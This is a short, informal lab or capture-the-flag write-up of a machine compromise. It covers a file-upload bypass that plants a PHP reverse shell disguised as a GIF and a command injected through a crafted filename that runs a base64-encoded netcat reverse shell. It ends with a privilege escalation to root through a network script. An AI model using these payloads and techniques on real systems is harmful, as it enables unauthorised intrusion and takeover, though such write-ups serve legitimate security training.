@@ -1,0 +1,47 @@
+we found a back up file with upload codes in it
+
+and a upload.php
+
+we first trid to inject ==php system cmd comamnd in comments== using exiftool and get a rce but couldnot do it
+
+as 500 page error
+
+so we did chose rev.php and
+
+```
+------WebKitFormBoundaryItAZ1OAxQTB8rmbI
+Content-Disposition: form-data; name="myFile"; filename="req.php.gif"
+Content-Type: image/gif
+
+GIF8;
+<?php
+// php-reverse-shell - A Reverse Shell implementation in PHP
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+//
+// This tool may be used for legal purposes only.  Users take full responsibility
+// for any actions performed using this tool.  The author accepts no liability
+// for damage caused by this tool.  If these terms are not acceptable to you, then
+// do not use this tool.
+```
+
+we changed the file name to .php.gif and added a ==GIF8==; or GIF89a; wirh GIF it was not working
+
+we got a shell
+
+the code which was exploitable was  `exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");`
+
+as $value above is used as a key to iterate over all the file names so if we did ;  a ==semicolon== the query will break and we can execute our code in there
+
+so we nc -e /bin/bash 10.10.14.9 5555 and base64 encoded it
+
+`touch 'a; echo bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE0LjcgNDQzCg== | base64 -d | sh; b'`
+
+and we got shell
+
+in directory we found a file `/etc/sysconfig/network-scripts/ifcfg-gul`
+
+this can be exploited by a simple shell ==/bin/bash==
+
+it asks for input if we give input like `a /bin/bash`
+
+it gives shell as root.
